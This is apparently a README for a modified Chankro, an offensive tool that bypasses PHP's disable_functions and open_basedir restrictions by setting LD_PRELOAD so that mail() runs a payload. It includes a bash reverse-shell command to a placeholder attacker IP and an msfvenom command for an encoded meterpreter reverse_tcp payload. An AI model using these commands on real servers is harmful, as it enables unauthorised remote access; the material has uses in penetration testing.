<img src="/images/example.jpg">

# Chankro

Chankro is an impressive tool designed by TarlogicSecurity for bypassing PHP's __disable_functions__ and __open_basedir__ restrictions. This repository contains a modified version of Chankro. For the original source, visit [Chankro](https://github.com/TarlogicSecurity/Chankro).

## How it works

In Linux, when the mail() function is executed in PHP, it triggers the execution of a binary called sendmail. Leveraging the availability of the putenv() function, we can set the "LD_PRELOAD" environment variable, which allows us to preload a custom shared object. This shared object executes a custom payload—either a binary or a Bash script—without being constrained by PHP's restrictions. This enables us to establish actions like a reverse shell.

## Example:

The usage syntax is straightforward:

```
$ python chankro.py -a 64 -p rev.sh -o chankro.php -t /var/www/html
```

Note:
1. The target path represents the absolute location where our .so file will be deposited.
2. The payload is binary file of shell like sh, meterpreter, etc. E.g.:
	 ```
	 $ echo "bash -c 'sh -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'" > rev.sh
	 ```
	 ```
	 $ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -e x86/shikata_ga_nai -f elf -o payl86.elf
	 ```
   Please ensure you replace <ATTACKER_IP> and <ATTACKER_PORT> with the actual IP address and port you intend to use for the reverse shell connection.

## Install

### Requirements
1. Python 3

### Git

```
 $ git clone https://github.com/mrizkihidayat66/chankro-reborn.git
 $ cd chankro-reborn
 $ python chankro.py -h
```
Please make sure to have Python 3 installed before using Chankro. After cloning the repository using Git, navigate to the appropriate directory and consult the help (-h) command for further guidance on using the tool.

### Reference
1. [Asem Eleraky](https://melotover.medium.com) - [How I bypassed disable_functions in php to get a remote shell](https://infosecwriteups.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979)